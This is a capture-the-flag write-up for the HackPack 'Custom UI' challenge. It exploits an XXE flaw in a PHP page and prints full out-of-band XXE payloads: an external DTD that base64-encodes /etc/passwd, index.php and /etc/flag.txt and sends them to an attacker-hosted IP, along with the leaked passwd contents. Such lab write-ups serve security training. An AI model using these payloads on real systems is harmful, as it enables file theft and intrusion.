---
title: "HackPack: Custom UI"
categories:
  - HackPack
tags:
  - HackPack
---


Visiting https://custom-ui.cha.hackpack.club gives us a user interface, where we can enter RGB values for a button, along with its text. Catching the request and setting "xdata='" in the POST request gives us the following error:

```
DOMDocument::loadXML(): Start tag expected, '&lt;' not found in Entity, line: 1 in <b>/var/www/html/index.php</b> on line <b>12<
```

Looks like we have an XXE vuln!

Messing around with the vuln shows us that we can't see anything loaded with a file:// wrapper, but we can use an OOB technique:

evil.dtd (hosted on attacking machine):

```
<!ENTITY % data SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd"><!ENTITY % param1 "<!ENTITY exfil SYSTEM 'http://54.234.159.90/evil2.dtd?%data;'>">
```

We'll need to form a valid XML request and base64 encode it, so the newlines are kept intact:

```
<?xml version="1.0" ?>
<!DOCTYPE r [
<!ELEMENT r ANY >
<!ENTITY % sp SYSTEM "http://54.234.159.90/evil.dtd">
%sp;
%param1;
]>
<r>&exfil;</r>
```

Now, we send the base64 encoded payload in the xdata= section of the post request with burp, and we receive a base64 encoded payload back on our attacking machine! Decoding the base64 gives us:

```
root:x:0:0:root:/root:/bin/bash                                                                                      
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin                
sys:x:3:3:sys:/dev:/usr/sbin/nologin                
sync:x:4:65534:sync:/bin:/bin/sync                                                                                   
games:x:5:60:games:/usr/games:/usr/sbin/nologin 
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin                                                                      
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin                                                                         
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin                                                                    
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin                                                                  
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin                                                                           
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin                                                                 
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin                                                                 
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin                                                        
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin                                                                     
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin                                    
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin                                                           
_apt:x:100:65534::/nonexistent:/bin/false  
```

Next, we'll check to see if there's any hidden info in the index.php page:

```
<!ENTITY % data SYSTEM "php://filter/convert.base64-encode/resource=/var/www/html/index.php"><!ENTITY % param1 "<!ENTITY exfil SYSTEM 'http://54.234.159.90/evil.dtd?%data;'>">
```

Decoding the response gives us the following interesting section:

```
  <?php 
    if ($debug == "true") {
      echo "<!-- TODO: Delete flag.txt from /etc/ -->";
    }
  ?>
```

We'll form one final request to grab the flag:

```
<!ENTITY % data SYSTEM "php://filter/convert.base64-encode/resource=/etc/flag.txt"><!ENTITY % param1 "<!ENTITY exfil SYSTEM 'http://54.234.159.90/evil.dtd?%data;'>">
```

We get:

**flag{d1d_y0u_kn0w_th@t_xml_can_run_code?}**
